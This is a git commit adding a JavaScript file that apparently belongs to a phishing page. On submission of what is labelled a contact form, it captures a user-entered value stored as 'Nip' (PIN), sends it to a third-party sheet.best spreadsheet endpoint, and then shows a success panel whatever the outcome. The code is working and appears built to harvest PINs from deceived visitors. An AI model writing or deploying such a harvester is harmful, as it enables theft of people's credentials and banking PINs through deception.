3ff1837e50a1f7403815fc8db68b668032d41a37
support483 <funzyfnz1@gmail.com>
2024-07-05 23:13:36 -0600

    Add files via upload

---
+++ js/app2.js
@@ -0,0 +1,29 @@
+const formulario = document.getElementById('contact-form');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+formulario.addEventListener('submit', async(e) =>{
+    e.preventDefault();
+
+
+try {    
+    const respuesta = await fetch('https://sheet.best/api/sheets/35ebdd19-4e93-4aa1-9c39-9a827f07c757', {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            "Nip": formulario.usuario.value
+        })
+    });
+
+
+
+} catch(error){
+    console.log(error);
+}
+    
+    registro.classList.remove('activo');
+    exito.classList.add('activo');
+});
